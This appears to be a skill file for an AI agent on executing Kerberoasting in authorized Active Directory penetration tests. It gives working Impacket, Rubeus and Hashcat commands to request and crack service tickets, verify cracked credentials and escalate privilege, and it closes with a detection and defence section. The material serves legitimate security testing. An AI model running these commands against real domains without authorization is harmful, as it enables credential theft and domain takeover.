---
name: kerberoast-execution
description: Use when you have any valid domain credential on an authorized
  AD engagement and need to request crackable Kerberos service tickets.
  Covers SPN ticket requests with Rubeus and Impacket, ticket extraction
  and formatting for Hashcat, and opsec-conscious request patterns. Use
  when hunting service accounts with weak passwords, when you need offline
  crackable material without touching the account, or when turning one low
  privilege credential into domain privilege.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
parent: kerberoasting
requires: [kerberoasting]
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: Impacket
    version: 0.11.0
  - name: Hashcat
    version: 6.2.6
  - name: PowerShell
    version: 7.4
---

Kerberoasting requests a service ticket for every SPN account and cracks
the ticket's encrypted part offline: the service account's password hash,
without ever touching the account. Any domain user can do it, which makes
it one of the highest-yield AD techniques. This skill covers executing it
on authorized engagements: requesting tickets, formatting them for the
cracker, and keeping the request pattern sane.

## Quick Workflow

1. Confirm you hold any valid domain credential (any user works).
2. Enumerate SPN accounts and note their service types.
3. Request service tickets for the SPN set.
4. Export tickets in Hashcat format ($krb5tgs$).
5. Crack with the password-attacks workflow, starting targeted.
6. Verify cracked credentials by binding, and handle them securely.
7. Report each cracked service account with its privilege level.

## 1. Requesting tickets

```bash
# Impacket: request all SPN tickets, output in Hashcat format
python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:'TestPass123!' \
  -dc-ip 10.0.5.10 -request -outputfile /tmp/kerberoast.txt
head -3 /tmp/kerberoast.txt

# Target one high-value SPN only (quieter, for sensitive phases)
python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:'TestPass123!' \
  -dc-ip 10.0.5.10 -request-user sqlservice -outputfile /tmp/one.txt
```

```powershell
# Rubeus on a domain-joined Windows host
Rubeus.exe kerberoast /outfile:C:\temp\hashes.txt
# Targeted: Rubeus.exe kerberoast /user:sqlservice /outfile:C:\temp\one.txt
```

Requesting all SPNs at once is the standard pattern and is what
defenders expect to see. Targeted requests are quieter but slower; use
them when the engagement calls for low visibility.

## 2. Cracking the tickets

```bash
# Hashcat mode 13100 = Kerberos 5 TGS-REP
hashcat -m 13100 /tmp/kerberoast.txt /tmp/targeted_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule -o /tmp/krb_cracked.txt

# Check the service account names first: human-named service accounts
# (sqlservice, backupsvc) crack far more often than random ones
cut -d'$' -f4 /tmp/kerberoast.txt | sort -u | head -20

# Verify a cracked credential immediately (it may already be rotated)
python3 /opt/impacket/examples/ldapsearch.py \
  corp.example/sqlservice:'CrackedPass123!' -dc-ip 10.0.5.10 \
  -request "(sAMAccountName=sqlservice)" -attributes memberOf 2>&1 | head -10
```

Prioritize by privilege: crack the SPN list, then check each cracked
account's group membership. A cracked Domain Admin service account ends
the engagement; a cracked low-privilege SQL account is lateral movement.

## Edge cases

- AES-only service accounts resist classic kerberoasting. The ticket
  uses the account's strongest etype; AES tickets need much more work,
  so note the account and move on unless time allows.
- No SPNs exist. Small or hardened domains may have none; check for
  AS-REP roastable accounts instead (see asrep-roast-execution).
- The crack yields nothing. Service accounts with 30-character random
  passwords are the correct configuration; report the negative result
  as positive assurance for those accounts.
- Ticket requests get blocked. Some defenses throttle TGS requests;
  slow down and target high-value SPNs only.

## Escalation

- A cracked account has high privilege: follow the engagement's
  credential handling, use the access for the objectives, and report
  the weak password as the root cause.
- You need the ticket for pass-the-ticket instead of the password: keep
  the raw ticket (see ticket-analysis) alongside the crack attempt.
- Mass kerberoasting is too noisy for this phase: switch to targeted
  requests against the accounts that matter.

## Detection and defender view

Defenders see kerberoasting as a burst of TGS-REQ packets for many SPNs
from one user, especially users who never request tickets normally, plus
RC4 etype requests. Good detection is KDC analytics on ticket request
patterns. Defenses are long random passwords (30+ characters) on all
service accounts, AES-only where possible, managed service accounts
(gMSA) that rotate passwords automatically, and alerting on anomalous
TGS patterns.

## Key references

- MITRE ATT&CK T1558.003 (Steal or Forge Kerberos Tickets:
  Kerberoasting).
- CWE-521 (Weak Password Requirements).
- CWE-327 (Use of a Broken or Risky Cryptographic Algorithm, RC4).
- Impacket GetUserSPNs documentation.
